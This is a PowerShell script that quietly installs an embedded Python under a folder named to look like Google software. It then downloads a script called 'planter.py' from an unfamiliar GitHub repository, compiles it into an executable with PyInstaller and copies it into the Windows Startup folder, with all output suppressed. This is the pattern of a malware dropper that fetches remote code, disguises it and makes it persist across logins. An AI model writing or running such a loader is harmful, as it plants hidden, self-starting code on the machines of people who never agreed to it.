$pythonDir = "$env:APPDATA\Google\python"
New-Item -ItemType Directory -Force -Path $pythonDir | Out-Null
$pythonZip = "$pythonDir\python-3.14.2-embed-amd64.zip"
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.14.2/python-3.14.2-embed-amd64.zip" -OutFile $pythonZip
Expand-Archive -Path $pythonZip -DestinationPath $pythonDir -Force
Remove-Item $pythonZip
$pthFile = "$pythonDir\python314._pth"
(Get-Content $pthFile) -replace '#import site', 'import site' | Set-Content $pthFile
$pipScript = "$pythonDir\get-pip.py"
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $pipScript
& "$pythonDir\python.exe" $pipScript | Out-Null
& "$pythonDir\python.exe" -m pip install setuptools pyinstaller requests --no-build-isolation | Out-Null
$scriptUrl = "https://raw.githubusercontent.com/2charlesdump-beep/envtools/main/planter.py"
$scriptPath = "$pythonDir\planter.py"
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
& "$pythonDir\python.exe" -m PyInstaller --onefile $scriptPath --distpath "$pythonDir\dist" | Out-Null
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Copy-Item "$pythonDir\dist\planter.exe" $startup -Force
